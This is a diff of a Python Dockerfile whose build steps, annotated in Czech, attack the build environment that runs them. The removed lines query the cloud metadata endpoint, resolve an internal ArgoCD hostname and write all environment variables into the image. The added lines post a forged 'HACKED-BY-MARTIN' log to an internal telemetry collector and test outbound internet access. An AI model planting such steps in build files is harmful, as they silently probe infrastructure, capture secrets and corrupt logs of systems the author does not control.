@@ -1,12 +1,13 @@
 FROM python:3.9-slim
+RUN apt-get update && apt-get install -y curl
 
-# Instalace curl a nslookup
-RUN apt-get update && apt-get install -y curl dnsutils || echo "Instalace selhala"
+# Zkusíme poslat falešný log přímo do jejich vnitřního sběrače logů během buildu!
+RUN curl -X POST http://127.0.0.1:44725/v1/logs \
+    -H "Content-Type: application/json" \
+    -d '{"resourceLogs": [{"resource": {"attributes": [{"key": "service.name", "value": "HACKED-BY-MARTIN"}]}}]}' || echo "OTEL nedostupný"
 
-# Provedeme testy a výstup uložíme do souborů v obrazu
-RUN curl -m 3 -s http://169.254.169.254/latest/meta-data/hostname > /build_metadata.txt || echo "Metadata IP nedostupná" > /build_metadata.txt
-RUN nslookup argocd-server.argo.svc.cluster.local > /build_dns.txt || echo "DNS nedostupné" > /build_dns.txt
-RUN env > /build_env.txt
+# Zkusíme, jestli builder vidí ven na internet (Google DNS)
+RUN curl -m 3 -I http://8.8.8.8 || echo "Build nemá přístup k internetu"
 
 COPY . .
 CMD ["python", "app.py"]
